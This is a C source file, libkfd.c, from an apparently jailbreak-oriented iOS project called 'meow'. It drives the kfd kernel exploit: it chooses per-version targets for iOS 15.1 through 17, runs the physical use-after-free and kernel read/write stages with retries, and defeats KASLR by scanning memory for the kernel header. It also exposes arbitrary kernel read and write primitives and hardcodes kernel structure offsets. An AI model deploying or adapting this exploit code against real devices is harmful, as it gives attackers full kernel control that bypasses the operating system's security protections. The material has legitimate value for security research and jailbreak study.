//
//  libkfd.c
//  meow
//
//  Created by doraaa on 2023/11/24.
//

#include "libkfd.h"

#include "libkfd/info.h"
#include "libkfd/puaf.h"
#include "libkfd/krkw.h"
#include "libkfd/perf.h"
#include "libkfd/krkw/IOSurface_shared.h"

#include <mach/mach.h>
#include <mach-o/dyld.h>
#include <mach-o/getsect.h>
#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <mach-o/reloc.h>

bool isarm64e(void) {
    int ptrAuthVal = 0;
    size_t len = sizeof(ptrAuthVal);
    assert(sysctlbyname("hw.optional.arm.FEAT_PAuth", &ptrAuthVal, &len, NULL, 0) != -1);
    if(ptrAuthVal != 0)
        return true;
    return false;
}

int isAvailable(void) {
    int ptrAuthVal = 0;
    size_t len = sizeof(ptrAuthVal);
    assert(sysctlbyname("hw.optional.arm.FEAT_PAuth", &ptrAuthVal, &len, NULL, 0) != -1);
    if (@available(iOS 17.0, *)) {
        return 12;
    }
    if (@available(iOS 16.4, *)) {
        if (isarm64e())
            return 11;
        return 10;
    }
    if (@available(iOS 16.2, *)) {
        if (isarm64e())
            return 9;
        return 8;
    }
    if (@available(iOS 16.0, *)) {
        if (isarm64e())
            return 7;
        return 6;
    }
    if (@available(iOS 15.4, *)) {
        if (isarm64e())
            return 5;
        return 4;
    }
    if (@available(iOS 15.2, *)) {
        if (isarm64e())
            return 3;
        return 2;
    }
    if (@available(iOS 15.1, *)) {
        if (isarm64e())
            return 1;
        return 0;
    }
    return -1;
}

struct kfd* kfd_init(uint64_t exploit_type) {
    struct kfd* kfd = (struct kfd*)(malloc_bzero(sizeof(struct kfd)));
    info_init(kfd);
    puaf_init(kfd, exploit_type);
    krkw_init(kfd);
    perf_init(kfd);
    return kfd;
}

void kfd_free(struct kfd* kfd) {
    if(isarm64e() && kfd->info.env.vid >= 6)
        perf_free(kfd);
    krkw_free(kfd);
    puaf_free(kfd);
    info_free(kfd);
    bzero_free(kfd, sizeof(struct kfd));
}

uint64_t kopen(uint64_t exploit_type, uint64_t pplrw) {
    int fail = -1;
    
    struct kfd* kfd = kfd_init(exploit_type);
    
    kfd->info.env.exploit_type = exploit_type;
    kfd->info.env.pplrw = false;
    if(pplrw == 0)
        kfd->info.env.pplrw = true;

retry:
    puaf_run(kfd);
    
    fail = krkw_run(kfd);
    
    if(fail && (exploit_type == MEOW_EXPLOIT_LANDA)) {
        // TODO: fix memory leak
        puaf_free(kfd);
        info_free(kfd);
        bzero(kfd, sizeof(struct kfd));
        info_init(kfd);
        puaf_init(kfd, exploit_type);
        krkw_init(kfd);
        perf_init(kfd);
        goto retry;
    }
    
    info_run(kfd);
    if(isarm64e() && kfd->info.env.vid >= 6)
        perf_run(kfd);
    if(isarm64e() && kfd->info.env.vid <= 5 && kfd->info.env.pplrw)
        perf_ptov(kfd);
    puaf_cleanup(kfd);
    
    return (uint64_t)(kfd);
}

void kread_kfd(uint64_t kfd, uint64_t va, void* ua, uint64_t size) {
    krkw_kread((struct kfd*)(kfd), va, ua, size);
}

void kwrite_kfd(uint64_t kfd, const void* ua, uint64_t va, uint64_t size) {
    krkw_kwrite((struct kfd*)(kfd), (void*)ua, va, size);
}

void kclose(uint64_t kfd) {
    kfd_free((struct kfd*)(kfd));
}

void kreadbuf_kfd(uint64_t va, void* ua, size_t size) {
    kread_kfd(_kfd, va, ua, size);
}

void kwritebuf_kfd(uint64_t va, const void* ua, size_t size) {
    kwrite_kfd(_kfd, ua, va, size);
}

uint64_t kread64_kfd(uint64_t va) {
    uint64_t u;
    kread_kfd(_kfd, va, &u, 8);
    return u;
}

uint32_t kread32_kfd(uint64_t va) {
    union {
        uint32_t u32[2];
        uint64_t u64;
    } u;
    u.u64 = kread64_kfd(va);
    return u.u32[0];
}

uint16_t kread16_kfd(uint64_t va) {
    union {
        uint16_t u16[4];
        uint64_t u64;
    } u;
    u.u64 = kread64_kfd(va);
    return u.u16[0];
}

uint8_t kread8_kfd(uint64_t va) {
    union {
        uint8_t u8[8];
        uint64_t u64;
    } u;
    u.u64 = kread64_kfd(va);
    return u.u8[0];
}

void kwrite64_kfd(uint64_t va, uint64_t val) {
    uint64_t u[1] = {};
    u[0] = val;
    kwrite_kfd((uint64_t)(_kfd), &u, va, 8);
}

void kwrite32_kfd(uint64_t va, uint32_t val) {
    union {
        uint32_t u32[2];
        uint64_t u64;
    } u;
    u.u64 = kread64_kfd(va);
    u.u32[0] = val;
    kwrite64_kfd(va, u.u64);
}

void kwrite16_kfd(uint64_t va, uint16_t val) {
    union {
        uint16_t u16[4];
        uint64_t u64;
    } u;
    u.u64 = kread64_kfd(va);
    u.u16[0] = val;
    kwrite64_kfd(va, u.u64);
}

void kwrite8_kfd(uint64_t va, uint8_t val) {
    union {
        uint8_t u8[8];
        uint64_t u64;
    } u;
    u.u64 = kread64_kfd(va);
    u.u8[0] = val;
    kwrite64_kfd(va, u.u64);
}

uint64_t get_kaslr_slide(void) {
    return ((struct kfd*)_kfd)->info.kernel.kernel_slide;
}

uint64_t get_kernel_proc(void) {
    return ((struct kfd*)_kfd)->info.kernel.kernel_proc;
}

uint64_t get_kernel_task(void) {
    return ((struct kfd*)_kfd)->info.kernel.kernel_task;
}

uint64_t get_current_proc(void) {
    return ((struct kfd*)_kfd)->info.kernel.current_proc;
}

uint64_t get_current_task(void) {
    return ((struct kfd*)_kfd)->info.kernel.current_task;
}

uint64_t get_current_map(void) {
    return ((struct kfd*)_kfd)->info.kernel.current_map;
}

uint64_t get_kernel_pmap(void) {
    return ((struct kfd*)_kfd)->info.kernel.kernel_pmap;
}

uint64_t get_current_pmap(void) {
    return ((struct kfd*)_kfd)->info.kernel.current_pmap;
}

uint64_t get_kernel_map(void) {
    return ((struct kfd*)_kfd)->info.kernel.kernel_map;
}

uint64_t get_kernel_ttbr0va(void) {
    return ((struct kfd*)_kfd)->info.kernel.ttbr[0].va;
}

uint64_t get_kernel_ttbr1va(void) {
    return ((struct kfd*)_kfd)->info.kernel.ttbr[1].va;
}

uint64_t get_kw_object_uaddr(void) {
    return ((struct kfd*)_kfd)->kwrite.krkw_object_uaddr;
}

uint64_t get_kernel_slide(void) {
    if(((struct kfd*)_kfd)->info.kernel.kernel_slide)
        return ((struct kfd*)_kfd)->info.kernel.kernel_slide;
    
    static uint64_t _kernel_slide = 0;
    
    if(!_kernel_slide) {
        
        // get kslide
        uint64_t field_uaddr = (uint64_t)(get_kw_object_uaddr()) + 0; // isa
        uint64_t textPtr = *(volatile uint64_t*)(field_uaddr);
        
        struct mach_header_64 kernel_header;
        
        uint64_t _kernel_base = 0;
        
        for (uint64_t page = textPtr & ~PAGE_MASK; true; page -= 0x4000) {
            struct mach_header_64 candidate_header;
            kreadbuf_kfd(page, &candidate_header, sizeof(candidate_header));
            
            if (candidate_header.magic == 0xFEEDFACF) {
                kernel_header = candidate_header;
                _kernel_base = page;
                break;
            }
        }
        
        if (kernel_header.filetype == 0xB) {
            // if we found 0xB, rescan forwards instead
            // don't ask me why (<=A10 specific issue)
            for (uint64_t page = textPtr & ~PAGE_MASK; true; page += 0x4000) {
                struct mach_header_64 candidate_header;
                kreadbuf_kfd(page, &candidate_header, sizeof(candidate_header));
                if (candidate_header.magic == 0xFEEDFACF) {
                    kernel_header = candidate_header;
                    _kernel_base = page;
                    break;
                }
            }
        }
        
        _kernel_slide = _kernel_base - KERNEL_BASE_ADDRESS;
        ((struct kfd*)_kfd)->info.kernel.kernel_slide = _kernel_slide;
    }
    
    return _kernel_slide;
}

uint64_t phystokv_kfd(uint64_t pa) {
    struct kfd* kfd = ((struct kfd*)_kfd);
    return phystokv(kfd, pa);
}

uint64_t vtophys_kfd(uint64_t va) {
    struct kfd* kfd = ((struct kfd*)_kfd);
    return vtophys(kfd, va);
}

uint64_t get_proc(pid_t target) {
    struct kfd* kfd = ((struct kfd*)_kfd);
    uint64_t proc_kaddr = get_kernel_proc();
    while (true) {
        int32_t pid = dynamic_kget(proc, p_pid, proc_kaddr);
        if (pid == target) {
            break;
        }
        proc_kaddr = dynamic_kget(proc, p_list_le_prev, proc_kaddr);
    }
    return proc_kaddr;
}

uint64_t off_pmap_tte = 0;

uint64_t off_p_pfd    = 0;
uint64_t off_p_textvp = 0;

uint64_t off_fp_glob = 0;
uint64_t off_fg_data = 0;
uint64_t off_fg_flag = 0;

uint64_t off_task_itk_space = 0;

uint64_t off_ipc_port_ip_kobject = 0x48;
uint64_t off_ipc_space_is_table  = 0;
uint64_t off_ipc_entry_ie_object = 0;

uint64_t off_fd_cdir = 0x20;

uint64_t off_namecache_nc_child_tqe_prev = 0;
uint64_t off_namecache_nc_vp             = 0x48;

uint64_t off_mount_mnt_devvp = 0x980;
uint64_t off_mount_mnt_flag = 0x70;

uint64_t off_vnode_v_ncchildren_tqh_first   = 0x30;
uint64_t off_vnode_v_iocount                = 0x64;
uint64_t off_vnode_v_usecount               = 0x60;
uint64_t off_vnode_v_flag                   = 0x54;
uint64_t off_vnode_v_name                   = 0xb8;
uint64_t off_vnode_v_mount                  = 0xd8;
uint64_t off_vnode_v_data                   = 0xe0;
uint64_t off_vnode_v_kusecount              = 0x5c;
uint64_t off_vnode_v_references             = 0x5b;
uint64_t off_vnode_v_parent                 = 0xc0;
uint64_t off_vnode_v_label                  = 0xe8;
uint64_t off_vnode_v_cred                   = 0x98;
uint64_t off_vnode_v_writecount             = 0xb0;
uint64_t off_vnode_v_type                   = 0x70;

void offset_exporter(void) {
    struct kfd* kfd = ((struct kfd*)_kfd);
    off_pmap_tte = static_offsetof(pmap, tte);
    
    off_p_pfd = dynamic_offsetof(proc, p_fd_fd_ofiles);
    off_task_itk_space = dynamic_offsetof(task, itk_space);
    
    off_fp_glob = static_offsetof(fileproc, fp_glob);
    off_fg_data = static_offsetof(fileglob, fg_data);
    off_fg_flag = static_offsetof(fileglob, fg_flag);
    
    off_ipc_space_is_table  = static_offsetof(ipc_space, is_table);
    off_ipc_entry_ie_object = static_offsetof(ipc_entry, ie_object);
    
    if(kfd->info.env.vid >= 10) {
        off_p_textvp = 0x548;
        off_namecache_nc_child_tqe_prev = 0x0;
    }
    
    if(kfd->info.env.vid <= 9) {
        off_p_textvp = 0x350;
        off_namecache_nc_child_tqe_prev = 0x10;
    }
    
    if(kfd->info.env.vid <= 5) {
        off_ipc_port_ip_kobject = 0x58;
    }
    
    if(kfd->info.env.vid <= 3) {
        off_p_textvp = 0x2a8;
    }
}
